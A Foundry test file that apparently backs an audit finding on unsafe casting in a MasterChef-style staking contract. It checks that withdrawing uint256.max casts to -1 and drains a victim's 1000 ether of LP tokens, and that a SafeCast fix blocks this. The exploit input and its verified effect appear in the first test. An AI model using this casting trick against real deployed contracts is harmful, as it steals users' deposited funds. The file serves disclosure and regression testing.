// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit, ERC20Mini, MasterChefFixed, LpDepositor} from "./51368-unsafe-casting-leads-to-overflowunderflow-halborn-entangle-l.sol";

contract UnsafeCastTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_maxUintCastPaysTheWholePool() public {
        Exploit exp = new Exploit();
        exp.run();

        assertEq(exp.chef().lastCast(), int256(-1), "uint256.max casts to -1");
        assertEq(exp.chef().totalLp(), 0, "chef LP balance is 0, as in the published PoC");
        assertEq(exp.stolen(), 1000 ether, "victim LP taken");
        assertEq(exp.lp().balanceOf(SINK), 1000 ether, "1000 ether of victim LP");
        assertEq(exp.chef().deposits(address(exp.victim())), 1000 ether, "victim deposit record was not what limited the payout");
        assertEq(exp.lp().balanceOf(address(exp)), 1 ether, "attacker is left holding only their own 1 ether");
    }

    function test_control_safeCastRevertsAndVictimKeeps1000() public {
        ERC20Mini lp = new ERC20Mini("LP");
        MasterChefFixed chef = new MasterChefFixed(lp);
        LpDepositor victim = new LpDepositor();

        lp.mint(address(this), 1 ether);
        lp.mint(address(victim), 1000 ether);
        lp.approve(address(chef), 1 ether);
        chef.deposit(1 ether);
        victim.depositFixed(chef, lp, 1000 ether);

        vm.expectRevert(bytes("SafeCast"));
        chef.withdrawLP(type(uint256).max, address(this));

        chef.withdrawLP(1 ether, address(this));

        assertEq(chef.totalLp(), 1000 ether, "victim LP still in the chef");
        assertEq(chef.deposits(address(victim)), 1000 ether, "victim deposit intact");
        assertEq(lp.balanceOf(address(this)), 1 ether, "attacker withdrew only 1 ether");
        assertEq(lp.balanceOf(SINK), 0, "control does not produce 1000 ether");
    }
}
